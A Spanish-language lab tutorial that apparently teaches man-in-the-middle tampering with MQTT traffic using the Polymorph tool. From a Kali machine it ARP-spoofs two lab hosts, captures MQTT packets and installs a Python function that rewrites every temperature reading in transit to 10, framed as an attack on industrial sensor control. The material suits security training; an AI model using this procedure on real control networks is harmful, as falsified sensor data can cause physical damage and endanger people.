# Polymorph (Manipulación de trafico MQTT)

Este tipo de protocolos se suelen utilizar por ejemplo donde hay sistemas de control industrial de manera que podemos tener un sensor que esta obteniendo la temperatura que hay en el ambiente cada 10 o 20 segundos y manda esa informacion a un servidor que controla por ejemplo una turbina o algo asi, que en funcion de la temperatura que hay, la pone a mas o menos velocidad para refrigerar pues cualquier tipo de sistema o de mecanica que haya por detras.

Por lo que vamos a instalar algunas dependencias que se necesitan en las maquinas las cuales vamos a testear esto, para que tengan el protocolo `MQTT` de `cliente` `servidor` entre 2 maquinas.

Nos iremos a la `Ubunut-Mutillidae` y pondremos lo siguiente:

```shell
sudo apt-get install mosquitto mosquitto-clients
```

Una vez que nos hayamos instalado esto en esa maquina haremos esto mismo para la maquina `Ubuntu-Metasploitable`.

Ahora tenemos que hacer que alguna maquina este suscrito dentro de la herramienta `mosquitto` algun tema.

Si nos vamos a la maquina `Ubuntu-Mutillidae` y ponemos lo siguiente:

```shell
mosquitto_sub -t temperatura
```

Pongamos que este es un caso practico en el que estamos creando esto para controlar la temperatura del ventilado de una turbina.

Y pongamos que la maquina `Ubuntu-Metasploitable` es un sensor y cada cierto tiempo con el siguiente comando...

```shell
mosquitto_pub -t temperatura -m 40 -h 192.168.16.136
```

con el `-t` el topico que va a "publicar". Con el `-m` el mensaje que va a enviar de temperatura en este caso. Con el `-h` es al hosts al que se lo va a enviar.

Y si nosotros ejecutamos esto, en la otra maquina veremos lo siguiente:

```
40
```

Pues si el sensor por asi ponerlo le va mandando periodicamente una serie de lecturas, para ir regulando la temperatura, imaginemos que como atacante podamos cambiar eso y modificar el paquete de red que se envia para que si le va a enviar una temperatura de `120º` le envie una de `10º` (Esto en la realidad seria una catastrofe, pero para que se vea al nivel que puede llegar esto.)

Ahora si nos vamos a `kali` y abrimos de nuevo `polymorph`, nos pondremos en mitad de la comunicacion con:

```shell
spoof -t 192.168.5.184 -g 192.168.5.183
```

Y ahora capturaremos paquetes `mqtt`:

```shell
capture -f mqtt
```

Ahora hacemos como que enviamos la temperatura en la maquina `Ubuntu-Metasploitable`:

```shell
mosquitto_pub -t temperatura -m 20 -h 192.168.5.184
```

Y si volvemos al `kali` y le hacemos `Ctrl+C` veremos que hemos capturado 4 paquetes.

Por lo que si le damos a `show` para ver los paquetes o mejor con `wireshark` podremos ver que el paquete numero `3` es el que nos interesa, por lo que en la terminal de `polymorph` pondremos lo siguiente para seleccionarlo:

```shell
template 3
```

Y si hacemos un `show` veremos todos los campos de dicho paquete.

Por lo que vamos a crearnos una funcion para modificar este paquete al numero de temperatura que nosotros queramos.

```shell
functions -a mod_mqtt -e nano

#Dentro del nano

def mod_mqtt(packet):
	if packet['IP']['proto'] == 6:
		if packet['MQTT']['hdrflags'] == '0x30':
			print("Paquete MQTT Publish recibido!")
			packet['MQTT']['msg'] = b'10'
			print("Paquete modificado!!")

	return packet
```

Para diferenciar del paquete que queremos modificar del que no, lo podemos ver con `wireshark` llendonos al paquete y mirando el `header flags` si es `0x30` sabemos que es un `Publish Message` por lo que es justo lo que queremos a parte de que lo pone seguidamente a la derecha en la seccion de `Message Type`.

Lo que estamos haciendo aqui es modificar el valor de `message` que envie el sensor por el valor `10` siempre, como si marcara siempre `10º`.

Ahora lo que haremos sera interceptar:

```shell
intercept
```

Y en la maquina `Ubuntu-Metasploitable` enviamos los grados como si fuera de forma real.

```shell
mosquitto_pub -t temperatura -m 90 -h 192.168.5.184
```

Si enviamos `90º` por ejemplo lo que veremos en la maquina `Ubuntu-Mutillidae` seran `10º` y veremos que todo ha funcionado correctamente.

Y en nuestro `kali` veremos lo siguiente:

```
Paquete MQTT Publish recibido!
Paquete modificado!!
```

Si quereis saber mas sobre el tema de modificar paquetes en tiempo real, estara en el siguiente link:

URL = [GitHub Info](https://github.com/shramos/polymorph/wiki)
